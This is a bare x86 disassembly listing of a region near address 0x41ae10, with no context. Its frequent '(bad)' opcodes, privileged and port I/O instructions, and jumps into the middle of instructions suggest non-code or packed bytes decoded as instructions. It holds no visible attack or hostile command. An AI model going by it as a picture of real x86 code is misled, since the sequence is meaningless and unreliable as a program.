  41ae10:	imul   esi,DWORD PTR [edi+0x2e30c0],0x49
  41ae17:	xchg   ebx,eax
  41ae18:	adc    BYTE PTR [edx+edx*4],bh
  41ae1b:	sahf   
  41ae1c:	sbb    BYTE PTR [eax-0x34],bl
  41ae1f:	sbb    dl,al
  41ae21:	xor    esi,DWORD PTR [edi+0x1c2682d3]
  41ae27:	out    dx,eax
  41ae28:	sahf   
  41ae29:	dec    ecx
  41ae2a:	mov    eax,0xef3f27c3
  41ae2f:	inc    edi
  41ae30:	(bad)  
  41ae31:	or     eax,edx
  41ae33:	sbb    ebp,ebp
  41ae35:	push   ecx
  41ae36:	push   ebp
  41ae37:	fst    DWORD PTR [ecx+0x2884237e]
  41ae3d:	mov    edx,0xc2cb928
  41ae42:	sbb    eax,0xa409cd25
  41ae47:	popa   
  41ae48:	cmp    DWORD PTR [ebx-0x6225acdf],ecx
  41ae4e:	ins    BYTE PTR es:[edi],dx
  41ae4f:	push   es
  41ae50:	xor    al,0x7e
  41ae52:	je     0x41ae33
  41ae54:	add    eax,0xe099b942
  41ae59:	pop    edx
  41ae5a:	dec    edx
  41ae5b:	push   esp
  41ae5c:	fmul   QWORD PTR [edx-0x1b]
  41ae5f:	mov    eax,ds:0xc4cff9e2
  41ae64:	lock mov esi,edx
  41ae67:	scas   al,BYTE PTR es:[edi]
  41ae68:	rol    DWORD PTR [esi+0x20195d0a],0xf2
  41ae6f:	xchg   ebp,eax
  41ae70:	fld    QWORD PTR [edi+0x5db5f889]
  41ae76:	cld    
  41ae77:	loop   0x41aeb7
  41ae79:	outs   dx,DWORD PTR ss:[esi]
  41ae7b:	sub    DWORD PTR [ecx-0x57b74511],0x26
  41ae82:	sub    BYTE PTR [ebp-0x7ab51acb],cl
  41ae88:	sahf   
  41ae89:	jecxz  0x41aeb0
  41ae8b:	xchg   ebp,eax
  41ae8c:	push   ecx
  41ae8d:	loopne 0x41ae9e
  41ae8f:	mov    gs,WORD PTR [ebp-0xf]
  41ae92:	cmp    BYTE PTR ds:0x5b2cc473,ch
  41ae98:	cmc    
  41ae99:	mov    al,0x1a
  41ae9b:	xor    edi,DWORD PTR [ebx-0x3c]
  41ae9e:	retf   0xed02
  41aea1:	enter  0x1934,0xdd
  41aea5:	mov    WORD PTR [ecx],ss
  41aea7:	xor    al,0x59
  41aea9:	std    
  41aeaa:	jnp    0x41ae49
  41aeac:	stc    
  41aead:	fst    DWORD PTR [eax+0x48]
  41aeb0:	mov    al,ds:0xccab6a38
  41aeb5:	loopne 0x41aeb6
  41aeb7:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41aeb8:	push   ds
  41aeb9:	data16 es js 0x41aeb2
  41aebd:	js     0x41aeb5
  41aebf:	outs   dx,DWORD PTR ds:[esi]
  41aec0:	retf   
  41aec1:	mov    ebp,0x270d894f
  41aec6:	je     0x41af40
  41aec8:	enter  0x5b62,0x82
  41aecc:	dec    esi
  41aecd:	cmp    bl,BYTE PTR [ecx]
  41aecf:	pop    es
  41aed0:	aam    0x43
  41aed2:	mov    dh,0x23
  41aed4:	push   0x7209cd2c
  41aed9:	add    ebp,DWORD PTR [eax-0x7fb7c8e6]
  41aedf:	hlt    
  41aee0:	sbb    eax,0x20826a7e
  41aee5:	ins    BYTE PTR es:[edi],dx
  41aee6:	or     BYTE PTR gs:[eax+0x58],cl
  41aeea:	dec    ebx
  41aeeb:	jmp    0x41aeaf
  41aeed:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41aeee:	sub    eax,0x3aae7808
  41aef3:	(bad)  
  41aef4:	stos   BYTE PTR es:[edi],al
  41aef5:	outs   dx,DWORD PTR ds:[esi]
  41aef6:	int    0x88
  41aef8:	jle    0x41aea4
  41aefa:	bound  esi,QWORD PTR [ebp+0x789e2b26]
  41af00:	inc    edi
  41af01:	dec    edx
  41af02:	cmp    DWORD PTR [ebp-0x3b],eax
  41af05:	leave  
  41af06:	mov    BYTE PTR [ebp-0x3c318419],bh
  41af0c:	shl    DWORD PTR [esp+eiz*2-0x6c],cl
  41af10:	outs   dx,BYTE PTR ds:[esi]
  41af11:	jbe    0x41af60
  41af13:	sar    bl,cl
  41af15:	fs ja  0x41aee6
  41af18:	repnz out 0x76,al
  41af1b:	(bad)  
  41af1c:	bound  eax,QWORD PTR [esi-0x41]
  41af1f:	fsub   DWORD PTR [ebp+0x12]
  41af22:	(bad)  
  41af24:	mov    ah,0x87
  41af26:	arpl   WORD PTR [edx-0x5a6c48f],bp
  41af2c:	mov    cl,dl
  41af2e:	jmp    0x41aeb3
  41af30:	inc    eax
  41af31:	push   esi
  41af32:	out    dx,eax
  41af33:	out    dx,al
  41af34:	pop    edx
  41af35:	sbb    al,0xa6
  41af37:	stos   DWORD PTR es:[edi],eax
  41af38:	shl    BYTE PTR [ebp-0x53],0x12
  41af3c:	iret   
  41af3d:	xor    dl,BYTE PTR [edi-0x7067b47f]
  41af43:	inc    esp
  41af44:	adc    al,0xf3
  41af46:	lahf   
  41af47:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41af48:	inc    esi
  41af49:	scas   al,BYTE PTR es:[edi]
  41af4a:	and    ebx,DWORD PTR [ebx+0x47]
  41af4d:	fbld   TBYTE PTR [ebp-0x74]
  41af50:	loopne 0x41af54
  41af52:	icebp  
  41af53:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41af54:	outs   dx,BYTE PTR ds:[esi]
  41af55:	ja     0x41af1e
  41af57:	ins    BYTE PTR es:[edi],dx
  41af58:	sahf   
  41af59:	adc    DWORD PTR [ecx+0x59cf3ea6],edx
  41af5f:	dec    ebx
  41af60:	ret    0x640e
  41af63:	xchg   DWORD PTR [edi-0x545d75f8],eax
  41af69:	lods   al,BYTE PTR ds:[esi]
  41af6a:	mov    dl,0xa0
  41af6c:	fnstcw WORD PTR [esp+edx*1-0x4]
  41af70:	mov    ch,0x29
  41af72:	je     0x41afb4
  41af74:	push   ds
  41af75:	sti    
  41af76:	cmp    DWORD PTR [edi-0x5f],0x62
  41af7a:	cmp    dh,BYTE PTR [edx-0x7]
  41af7d:	outs   dx,DWORD PTR ds:[esi]
  41af7e:	mov    al,ds:0x184b997
  41af83:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41af84:	push   0x2754675d
  41af89:	test   DWORD PTR [ecx+0x46],edi
  41af8c:	add    ecx,ebp
  41af8e:	dec    ecx
  41af8f:	push   ebp
  41af90:	mov    eax,ds:0xbd0e552d
  41af95:	hlt    
  41af96:	inc    eax
  41af97:	fcomp  st(2)
  41af99:	shl    dh,cl
  41af9b:	addr16 pushw 0xdf87
  41afa0:	fwait
  41afa1:	and    eax,0x64d1f16b
  41afa6:	adc    BYTE PTR [eax],0xda
  41afa9:	cs (bad) 
  41afab:	sar    DWORD PTR [esp+esi*4-0x29],cl
  41afaf:	div    bl
  41afb1:	mov    dl,0xa4
  41afb3:	jns    0x41af44
  41afb5:	mov    al,0xb0
  41afb7:	xor    DWORD PTR [edi-0x3c],eax
  41afba:	cmp    DWORD PTR ds:0x8b777aee,edx
  41afc0:	xchg   esi,eax
  41afc1:	(bad)  
  41afc2:	out    0xe7,al
  41afc4:	xchg   edi,eax
  41afc5:	add    eax,0x8c78b287
  41afca:	cmp    DWORD PTR [edx+0x34],0xffffffe9
  41afce:	push   edx
  41afcf:	pop    eax
  41afd0:	ret    
  41afd1:	les    bx,DWORD PTR [ebp-0x6a]
  41afd5:	lds    edx,FWORD PTR [ebx+0x58f1d472]
  41afdb:	or     BYTE PTR [ecx-0x10],ch
  41afde:	in     eax,0x27
  41afe0:	les    ebx,FWORD PTR [esi+0xf790a17]
  41afe6:	stc    
  41afe7:	leave  
  41afe8:	xchg   ebp,eax
  41afe9:	jge    0x41b016
  41afeb:	mov    BYTE PTR gs:[edi+0x42],cl
  41afef:	dec    esi
  41aff0:	push   0xb5042feb
  41aff5:	xor    al,al
  41aff7:	pop    edi
  41aff8:	sbb    ebx,0xb25460c8
  41affe:	(bad)  
  41afff:	pop    es
  41b000:	jg     0x41afd1
  41b002:	and    cl,BYTE PTR [edx-0x393d371c]
  41b008:	not    BYTE PTR [esi]
  41b00a:	dec    eax
  41b00b:	and    DWORD PTR ds:0xcef4d334,0x48c4ae5b
  41b015:	std    
  41b016:	push   es
  41b017:	ss ins BYTE PTR es:[edi],dx
  41b019:	fistp  QWORD PTR [esp+0x7e8c6be7]
  41b020:	push   eax
  41b021:	pusha  
  41b022:	pop    edx
  41b023:	arpl   WORD PTR [ebp-0x361510ff],bp
  41b029:	push   esp
  41b02a:	shr    DWORD PTR [ecx],1
  41b02c:	jmp    0x41b099
  41b02e:	mov    ah,0x65
  41b030:	pop    esi
  41b031:	inc    esi
  41b032:	div    DWORD PTR [edx+ecx*8+0x41]
  41b036:	cs dec eax
  41b038:	aad    0xbc
  41b03a:	mov    al,ds:0x9d72a4
  41b03f:	push   ss
  41b040:	adc    ah,al
  41b042:	jmp    0xeb2f560
  41b047:	in     al,dx
  41b048:	xor    dl,cl
  41b04a:	cmp    ebx,esi
  41b04c:	jle    0x41b01e
  41b04e:	inc    edx
  41b04f:	ret    
  41b050:	jg     0x41afd9
  41b052:	shr    cl,0xb1
  41b055:	lods   al,BYTE PTR ds:[esi]
  41b056:	cli    
  41b057:	or     ecx,DWORD PTR [ecx+0x3f]
  41b05a:	icebp  
  41b05b:	cmp    DWORD PTR [ebx-0x42c4fb],eax
  41b061:	jl     0x41b095
  41b063:	jle    0x41b01b
  41b065:	pop    edi
  41b066:	es mov ebx,0x770f2deb
  41b06c:	js     0x41b08f
  41b06e:	int    0x87
  41b070:	or     eax,0x983a7a64
  41b075:	mov    DWORD PTR [eax],edx
  41b077:	dec    edi
  41b078:	std    
  41b079:	pop    eax
  41b07a:	push   0xd870ea7c
  41b07f:	cmp    eax,ebx
  41b081:	scas   eax,DWORD PTR es:[edi]
  41b082:	pop    ds
  41b083:	xlat   BYTE PTR ds:[ebx]
  41b084:	aam    0xa5
  41b086:	fidiv  WORD PTR [ebp+0x1fe489fa]
  41b08c:	pop    esi
  41b08d:	stc    
  41b08e:	es (bad) 
  41b090:	loope  0x41b0ba
  41b092:	dec    ebp
  41b093:	(bad)
  41b096:	arpl   WORD PTR [edi],cx
  41b098:	inc    eax
  41b099:	aam    0x54
  41b09b:	es cs daa 
  41b09e:	cmp    eax,0xe4b8fc75
  41b0a3:	add    ah,BYTE PTR [ecx]
  41b0a5:	jae    0x41b069
  41b0a7:	sbb    eax,0x4cb9c014
  41b0ac:	(bad)  
  41b0ad:	(bad)  
  41b0ae:	mov    eax,0x1cf840e5
  41b0b3:	ret    
  41b0b4:	and    BYTE PTR [ebx],ah
  41b0b6:	xlat   BYTE PTR ds:[ebx]
  41b0b7:	retf   0x7876
  41b0ba:	cmp    BYTE PTR [esi+0x1a],ch
  41b0bd:	adc    DWORD PTR [edi-0x64],edx
  41b0c0:	test   al,0x9e
  41b0c2:	adc    eax,0x8c91dd9f
  41b0c7:	out    dx,eax
  41b0c8:	jne    0x41b06b
  41b0ca:	jno    0x41b0bd
  41b0cc:	and    al,0x6f
  41b0ce:	lock ins DWORD PTR es:[edi],dx
  41b0d0:	mov    eax,0x8c3994d7
  41b0d5:	fidivr DWORD PTR [edx-0x62]
  41b0d8:	inc    edx
  41b0d9:	in     al,dx
  41b0da:	jecxz  0x41b086
  41b0dc:	mov    ch,0x46
  41b0de:	cmp    al,0x70
  41b0e0:	pop    es
  41b0e1:	ret    0x381c
  41b0e4:	pop    ss
  41b0e5:	jae    0x41b114
  41b0e7:	adc    ebx,DWORD PTR [ebx-0x9]
  41b0ea:	mov    gs,WORD PTR [ebp-0x41]
  41b0ed:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41b0ee:	fild   DWORD PTR [edi-0x2c54e85e]
  41b0f4:	psrlq  mm0,QWORD PTR [ebp+0x66]
  41b0f8:	shl    BYTE PTR [eax],cl
  41b0fa:	dec    esp
  41b0fb:	mov    ds:0xfa100193,al
  41b100:	mov    ch,0xbd
  41b102:	push   cs
  41b103:	xor    edi,DWORD PTR [eax+esi*2-0x46]
  41b107:	hlt    
  41b108:	push   eax
  41b109:	or     al,0x63
  41b10b:	gs fwait
  41b10d:	aaa    
  41b10e:	xor    BYTE PTR [esi],al
  41b110:	inc    ebx
  41b111:	dec    esi
  41b112:	push   es
  41b113:	les    esp,FWORD PTR [eax-0x2163bf3c]
  41b119:	pusha  
  41b11a:	pop    esi
  41b11b:	icebp  
  41b11c:	jecxz  0x41b144
  41b11e:	push   edi
  41b11f:	mov    al,0x45
  41b121:	dec    ebp
  41b122:	jg     0x41b127
  41b124:	repnz out dx,al
  41b126:	pop    es
  41b127:	aam    0x35
  41b129:	xor    eax,0x843a1fe9
  41b12e:	and    cl,dh
  41b130:	mov    ds:0x7c5636bd,eax
  41b135:	xchg   ebx,eax
  41b136:	and    BYTE PTR [edx-0x1840e70d],bl
  41b13c:	mov    ch,bh
  41b13e:	mov    bh,0x92
  41b140:	mov    eax,0xb1f7c536
  41b145:	jecxz  0x41b1b0
  41b147:	hlt    
  41b148:	sbb    DWORD PTR [eax-0x9a23279],ecx
  41b14e:	outs   dx,DWORD PTR ds:[esi]
  41b14f:	adc    eax,0x1deebe2b
  41b154:	and    dl,BYTE PTR [ebp+0x2c]
  41b157:	pop    ss
  41b158:	popf   
  41b159:	js     0x41b0ee
  41b15b:	mov    ch,0xa9
  41b15d:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41b15e:	rcl    BYTE PTR [esi+0x420b3924],0x39
  41b165:	ins    BYTE PTR es:[edi],dx
  41b166:	out    dx,eax
  41b167:	jp     0x41b168
  41b169:	mov    ebp,0xeda056e8
  41b16e:	push   ss
  41b16f:	sbb    DWORD PTR [edx+0x70ae4e11],0x44843274
  41b179:	mov    cs,WORD PTR [edx]
  41b17b:	xor    eax,0xb276343
  41b180:	aad    0x97
  41b182:	mov    cl,0x38
  41b184:	xchg   ebp,eax
  41b185:	add    DWORD PTR [edi],0xffffffc0
  41b188:	out    0xa2,eax
  41b18a:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41b18b:	xchg   DWORD PTR [esi-0x72],ecx
  41b18e:	lahf   
  41b18f:	stos   DWORD PTR es:[edi],eax
  41b190:	add    dl,dh
  41b192:	in     eax,dx
  41b193:	div    BYTE PTR [ebx+0x73]
  41b196:	pushf  
  41b197:	aaa    
  41b198:	cld    
  41b199:	ins    BYTE PTR es:[edi],dx
  41b19a:	jg     0x41b1d0
  41b19c:	out    0xa4,eax
  41b19e:	stos   DWORD PTR es:[edi],eax
  41b19f:	je     0x41b122
  41b1a1:	xchg   bl,bh
  41b1a3:	loope  0x41b219
  41b1a5:	pop    edx
  41b1a6:	inc    esi
  41b1a7:	rep stos DWORD PTR es:[edi],eax
  41b1a9:	adc    DWORD PTR [ecx-0x16],0x17b154d0
  41b1b0:	cmp    DWORD PTR [esi-0x20],ebp
  41b1b3:	sub    al,0xe8
  41b1b5:	arpl   dx,bp
  41b1b7:	je     0x41b1a5
  41b1b9:	push   es
  41b1ba:	mov    ecx,0x52882d3a
  41b1bf:	fnsave [ecx-0x363bb4d6]
  41b1c5:	and    al,bh
  41b1c7:	or     eax,0xa67267b4
  41b1cc:	xchg   DWORD PTR ds:0x8cf44efa,esp
  41b1d2:	mov    dh,0x2d
  41b1d4:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41b1d5:	inc    esi
  41b1d6:	dec    ecx
  41b1d7:	cwde   
  41b1d8:	ja     0x41b238
  41b1da:	push   es
  41b1db:	cmc    
  41b1dc:	and    al,0xd
  41b1de:	ins    DWORD PTR es:[edi],dx
  41b1df:	std    
  41b1e0:	dec    esp
  41b1e1:	ret    0xc0ba
  41b1e4:	setb   BYTE PTR [esi+0x3368fb20]
  41b1eb:	(bad)  
  41b1ec:	push   cs
  41b1ed:	mov    al,0x50
  41b1ef:	sti    
  41b1f0:	inc    esi
  41b1f1:	add    DWORD PTR [edx+0x59],eax
  41b1f4:	je     0x41b234
  41b1f6:	mov    dh,0x3f
  41b1f8:	aas    
  41b1f9:	xor    DWORD PTR [ecx+eiz*2-0x77eaf08],edi
  41b200:	pop    ds
  41b201:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41b202:	stos   BYTE PTR es:[edi],al
  41b203:	sbb    esp,DWORD PTR [edi+0x52]
  41b206:	cwde   
  41b207:	xor    cl,0x22
  41b20a:	cmp    eax,0xa1e116bd
  41b20f:	fwait
  41b210:	push   ebp
  41b211:	in     eax,0x8a
  41b213:	xchg   ecx,eax
  41b214:	(bad)  
  41b216:	or     DWORD PTR [edi+0x6e257657],0x22
  41b21d:	ins    DWORD PTR es:[edi],dx
  41b21e:	adc    al,0xc1
  41b220:	xor    eax,0x6ca2d4f
  41b225:	lea    ebx,[esi]
  41b227:	push   edx
  41b228:	push   0xffffffae
  41b22a:	aad    0x3c
  41b22c:	mov    al,ds:0x334d137d
  41b231:	shl    BYTE PTR [edi],cl
  41b233:	xor    ebx,DWORD PTR [edx-0x56]
  41b236:	fbld   TBYTE PTR [esi+0x74]
  41b239:	push   ds
  41b23a:	add    ebp,eax
  41b23c:	fwait
  41b23d:	stos   BYTE PTR es:[edi],al
  41b23e:	int3   
  41b23f:	pop    esi
  41b240:	cmp    eax,0x71120535
  41b245:	xchg   ebx,eax
  41b246:	bts    DWORD PTR [ebp-0x6d],esp
  41b24a:	shl    BYTE PTR [ebx-0x4d],1
  41b24d:	retf   
  41b24e:	clc    
  41b24f:	mov    dl,0xd8
  41b251:	ja     0x41b2aa
  41b253:	cvtps2pd xmm6,QWORD PTR [ecx+esi*2+0x32]
  41b258:	mov    DWORD PTR [eax+esi*1],ebx
  41b25b:	sti    
  41b25c:	dec    edx
  41b25d:	test   DWORD PTR [esi+0x2b],esp
  41b260:	fstp   QWORD PTR [eax]
  41b262:	fistp  QWORD PTR [ebp-0x13f944db]
  41b268:	sub    DWORD PTR [ecx],esi
  41b26a:	ror    edi,0xd5
  41b26d:	mov    edx,0xfa1a0ffc
  41b272:	imul   ebx,DWORD PTR [ecx+0x2f01f3d5],0x67
  41b279:	fstp   st(5)
  41b27b:	xor    ebp,DWORD PTR [eax-0x1ce2cf21]
  41b281:	lea    ebx,[ecx-0x22]
  41b284:	(bad)  
  41b285:	fwait
  41b286:	xor    al,0x55
  41b288:	jp     0x41b2fd
  41b28a:	aad    0x4b
  41b28c:	aas    
  41b28d:	inc    edx
  41b28e:	sbb    eax,0x3301f295
  41b293:	outs   dx,BYTE PTR ds:[esi]
  41b294:	cs ds sub al,0x78
  41b298:	xchg   DWORD PTR [edi+0x1b],ecx
  41b29b:	fs jae 0x41b286
  41b29e:	or     eax,0x3e0cb92a
  41b2a3:	push   0xeca050c
  41b2a8:	call   0x1926:0x411f82df
  41b2af:	xchg   edi,eax
  41b2b0:	mov    al,ds:0x80eda2ab
  41b2b5:	pusha  
  41b2b6:	pop    ds
  41b2b7:	mov    esi,0x7ec60a29
  41b2bc:	inc    ebp
  41b2bd:	and    ecx,esp
  41b2bf:	mov    ds,esp
  41b2c1:	push   0xc88355b4
  41b2c6:	sub    ecx,ebx
  41b2c8:	arpl   si,si
  41b2ca:	pop    esp
  41b2cb:	and    bh,dh
  41b2cd:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41b2ce:	lahf   
  41b2cf:	xlat   BYTE PTR ds:[ebx]
  41b2d0:	and    al,0x20
  41b2d2:	das    
  41b2d3:	shr    DWORD PTR [edi],cl
  41b2d5:	xor    eax,0x93920af4
  41b2da:	js     0x41b314
  41b2dc:	(bad)  
  41b2de:	mov    dh,0x9c
  41b2e0:	outs   dx,BYTE PTR ds:[esi]
  41b2e1:	test   edx,edi
  41b2e3:	sar    ecx,cl
  41b2e5:	xchg   edx,eax
  41b2e6:	div    esp
  41b2e8:	in     al,0x57
  41b2ea:	mov    dh,0xf3
  41b2ec:	or     eax,0x8b80fd52
  41b2f1:	iret   
  41b2f2:	lods   al,BYTE PTR ds:[esi]
  41b2f3:	sub    DWORD PTR [ebp+0xf],esp
  41b2f6:	cmp    eax,0x556a1953
  41b2fb:	ret    0x2745
  41b2fe:	and    ch,BYTE PTR [edx+0x4b]
  41b301:	sti    
  41b302:	or     DWORD PTR [edx],ebx
  41b304:	inc    eax
  41b305:	cmp    edi,esi
  41b307:	adc    dh,BYTE PTR [ecx]
  41b309:	mov    dl,0x3
  41b30b:	adc    eax,DWORD PTR gs:[edx+edi*1+0x64]
  41b310:	add    al,0x35
  41b312:	call   0x5cba3420
  41b317:	(bad)
  41b31a:	sbb    DWORD PTR [edx+0x4832fc38],edi
  41b320:	or     bl,dh
  41b322:	fwait
  41b323:	inc    ebp
  41b324:	test   BYTE PTR ds:0x5ce7a69c,bh
  41b32a:	sbb    bl,BYTE PTR [esi+0x16]
  41b32d:	lds    ebx,FWORD PTR [edx+0xa6438aa]
  41b333:	or     edi,DWORD PTR [ebx]
  41b335:	popa   
  41b336:	imul   esp,DWORD PTR ds:0x88effd2f,0x84da428c
  41b340:	mov    al,0xab
  41b342:	cmp    eax,0x6801d33a
  41b347:	and    ch,bh
  41b349:	outs   dx,BYTE PTR ds:[esi]
  41b34a:	mov    ebp,0x5b2f7c94
  41b34f:	js     0x41b37d
  41b351:	lea    edi,[ecx+eiz*8+0x17daa582]
  41b358:	or     edx,eax
  41b35a:	xchg   edi,eax
  41b35b:	scas   eax,DWORD PTR es:[edi]
  41b35c:	mov    bl,0x70
  41b35e:	std    
  41b35f:	jns    0x41b3ae
  41b361:	mov    ds:0x300a66fd,al
  41b366:	test   BYTE PTR [edi+0x1e],dh
  41b369:	pop    edx
  41b36a:	out    dx,eax
  41b36b:	dec    edi
  41b36c:	sub    dl,dh
  41b36e:	mov    esp,0x5282db79
  41b373:	add    DWORD PTR [ebp+0x3a],ecx
  41b376:	fcmovnbe st,st(7)
  41b378:	push   esp
  41b379:	jo     0x41b30a
  41b37b:	jmp    0x6ae76d53
  41b380:	movsx  ebx,cl
  41b383:	arpl   WORD PTR [ebx+0x4ca9013f],sp
  41b389:	imul   edx,DWORD PTR [ebp+0x63ea2bc3],0xa9a9d647
  41b393:	add    bl,BYTE PTR [eax+0x4a]
  41b396:	or     BYTE PTR [esi+ebx*4+0x2],bl
  41b39a:	cmp    ebx,eax
  41b39c:	fist   DWORD PTR [ecx-0x4b8cf710]
  41b3a2:	mov    dl,0x75
  41b3a4:	adc    dh,bh
  41b3a6:	pop    edi
  41b3a7:	aad    0x82
  41b3a9:	hlt    
  41b3aa:	shl    eax,1
  41b3ac:	(bad)  
  41b3ad:	push   ebx
  41b3ae:	repnz mov eax,0xab94a130
  41b3b4:	mov    ebp,0x6c2b15cc
  41b3b9:	imul   al
  41b3bb:	pop    ebp
  41b3bc:	add    ebp,esi
  41b3be:	in     eax,0x67
  41b3c0:	add    BYTE PTR [esi-0x3e],cl
  41b3c3:	push   es
  41b3c4:	cmp    BYTE PTR [eax],0x59
  41b3c7:	in     al,0x52
  41b3c9:	sbb    BYTE PTR [ebx-0x72a6be7e],bh
  41b3cf:	dec    esp
  41b3d0:	aaa    
  41b3d1:	add    ah,ah
  41b3d3:	pop    ebp
  41b3d4:	mov    edi,0xa961afff
  41b3d9:	jg     0x41b3ef
  41b3db:	add    BYTE PTR [eax+0x3e],0xd1
  41b3df:	mov    edx,DWORD PTR [ecx+eax*8-0x36]
  41b3e3:	scas   al,BYTE PTR es:[edi]
  41b3e4:	pusha  
  41b3e5:	les    esi,FWORD PTR [ecx-0x3a756a4c]
  41b3eb:	dec    ebx
  41b3ec:	jns    0x41b3b9
  41b3ee:	ret    
  41b3ef:	jne    0x41b3d0
  41b3f1:	fcom   DWORD PTR [esi]
  41b3f3:	push   esi
  41b3f4:	and    DWORD PTR [eax+ecx*8+0x929304f],edi
  41b3fb:	add    ecx,DWORD PTR [edi]
  41b3fd:	in     eax,0x33
  41b3ff:	loop   0x41b387
  41b401:	jmp    0x41b40f
  41b403:	cs dec eax
  41b405:	mov    WORD PTR [edx+0x31ffeb5f],cs
  41b40b:	push   ebp
  41b40c:	push   es
  41b40d:	pop    esp
  41b40e:	hlt    
  41b40f:	inc    edi
  41b410:	in     al,0x79
  41b412:	in     eax,dx
  41b413:	fbld   TBYTE PTR [edi+ecx*1]
  41b416:	sbb    al,0x2c
  41b418:	pop    eax
  41b419:	mov    edi,cs
  41b41b:	xor    DWORD PTR [ecx+0x533a787b],0xfffffffa
  41b422:	inc    ecx
  41b423:	and    edi,DWORD PTR ds:0x6a3dc931
  41b429:	adc    DWORD PTR [edi],edi
  41b42b:	mov    dl,dh
  41b42d:	mov    eax,0xc31dba87
  41b432:	loop   0x41b480
  41b434:	lods   eax,DWORD PTR ds:[esi]
  41b435:	ins    DWORD PTR es:[edi],dx
  41b436:	out    0xe5,al
  41b438:	jnp    0x41b3d7
  41b43a:	outs   dx,BYTE PTR ds:[esi]
  41b43b:	outs   dx,BYTE PTR ds:[esi]
  41b43c:	leave  
  41b43d:	and    al,ah
  41b43f:	test   BYTE PTR [edx+0x4e],ah
  41b442:	inc    ecx
  41b443:	pop    eax
  41b444:	cli    
  41b445:	add    bl,dl
  41b447:	push   esi
  41b448:	add    BYTE PTR [eax-0x66],0x5c
  41b44c:	int    0x5f
  41b44e:	push   ebx
  41b44f:	test   DWORD PTR [ebx-0x536f2764],edi
  41b455:	mov    esp,0x9d646601
  41b45a:	ret    0xf075
  41b45d:	xchg   DWORD PTR [ebx+0x6cfd196c],ebx
  41b463:	in     eax,0x57
  41b465:	aaa    
  41b466:	ror    BYTE PTR ds:0x7e1acade,cl
  41b46c:	in     eax,0xa3
  41b46e:	xchg   ebx,eax
  41b46f:	pop    ebp
  41b470:	sbb    al,0xcd
  41b472:	sub    edx,DWORD PTR [eax-0x73c260c1]
  41b478:	cli    
  41b479:	loope  0x41b44b
  41b47b:	sub    ch,BYTE PTR [esp+edx*4]
  41b47e:	mov    ecx,0x37809e99
  41b483:	push   es
  41b484:	nop
  41b485:	call   0x12ab:0xd05192ad
  41b48c:	iret   
  41b48d:	mov    al,ds:0xb248ac1c
  41b492:	cmp    bh,BYTE PTR [esi]
  41b494:	push   esi
  41b495:	inc    ebp
  41b496:	scas   al,BYTE PTR es:[edi]
  41b497:	pop    ss
  41b498:	jmp    0x41b516
  41b49a:	ja     0x41b4f1
  41b49c:	test   al,0x70
  41b49e:	mov    bl,0x9c
  41b4a0:	nop
  41b4a1:	shl    BYTE PTR [ecx-0x68],cl
  41b4a4:	and    al,0xdb
  41b4a6:	push   ds
  41b4a7:	pop    edi
  41b4a8:	jle    0x41b4f2
  41b4aa:	xchg   esp,eax
  41b4ab:	call   0xf18d:0xb0193fb8
  41b4b2:	sub    BYTE PTR [ebx],ch
  41b4b4:	in     al,0x68
  41b4b6:	popa   
  41b4b7:	jle    0x41b447
  41b4b9:	jmp    0xec8916f5
  41b4be:	fst    DWORD PTR [esi]
  41b4c0:	mov    ch,0x10
  41b4c2:	mov    bl,0x0
  41b4c4:	ins    DWORD PTR es:[edi],dx
  41b4c5:	jbe    0x41b546
  41b4c7:	les    edi,FWORD PTR [edx]
  41b4c9:	clc    
  41b4ca:	push   cs
  41b4cb:	int    0x67
  41b4cd:	arpl   WORD PTR [ebp-0x1fa545bb],si
  41b4d3:	or     dl,BYTE PTR [ebp-0x70]
  41b4d6:	sbb    eax,0x1d09bd4d
  41b4db:	(bad)  
  41b4dd:	repnz push eax
  41b4df:	arpl   WORD PTR [ecx-0x5950982d],cx
  41b4e5:	push   ds
  41b4e6:	xchg   BYTE PTR [ebx-0x7],ah
  41b4e9:	test   eax,0x8bd5e929
  41b4ee:	adc    dh,ah
  41b4f0:	push   eax
  41b4f1:	sub    eax,0x1b1436d1
  41b4f6:	push   edi
  41b4f7:	push   ebx
  41b4f8:	int3   
  41b4f9:	mov    ebx,0xf95c5d50
  41b4fe:	std    
  41b4ff:	jo     0x41b495
  41b501:	xchg   ebp,eax
  41b502:	xor    DWORD PTR [edx-0x49],ebx
  41b505:	add    ebp,DWORD PTR [esi-0x68]
  41b508:	push   ebp
  41b509:	mov    ds:0x735a7262,eax
  41b50e:	es mov al,0xd
  41b511:	and    al,0x6d
  41b513:	push   es
  41b514:	jmp    0xefda:0x7afb1ec1
  41b51b:	sbb    cl,bl
  41b51d:	push   0x77
  41b51f:	pop    ebx
  41b520:	ss push 0x4b8fc87
  41b526:	mov    ch,0x73
  41b528:	mov    ebx,0x91dc4aeb
  41b52d:	dec    edx
  41b52e:	enter  0x9248,0xa8
  41b532:	or     al,0xb6
  41b534:	add    DWORD PTR [ebp+0x22],ebx
  41b537:	out    dx,eax
  41b538:	sub    BYTE PTR [ecx],dh
  41b53a:	cmp    esp,DWORD PTR [ebx]
  41b53c:	fldz   
  41b53e:	push   eax
  41b53f:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41b540:	ret    
  41b541:	jo     0x41b520
  41b543:	inc    edx
  41b544:	jl     0x41b4ce
  41b546:	pop    ecx
  41b547:	ss sbb al,0x99
  41b54a:	into   
  41b54b:	mov    cl,0xb6
  41b54d:	(bad)  
  41b54e:	(bad)  
  41b54f:	xchg   ebp,eax
  41b550:	es loope 0x41b5cb
  41b553:	popf   
  41b554:	xlat   BYTE PTR ds:[ebx]
  41b555:	adc    DWORD PTR [ebp+0xdce5159],eax
  41b55b:	mov    dh,0xe8
  41b55d:	lea    edi,[ecx-0x5a]
  41b560:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41b561:	loop   0x41b562
  41b563:	sysret 
  41b565:	pusha  
  41b566:	stc    
  41b567:	loop   0x41b5c7
  41b569:	retf   
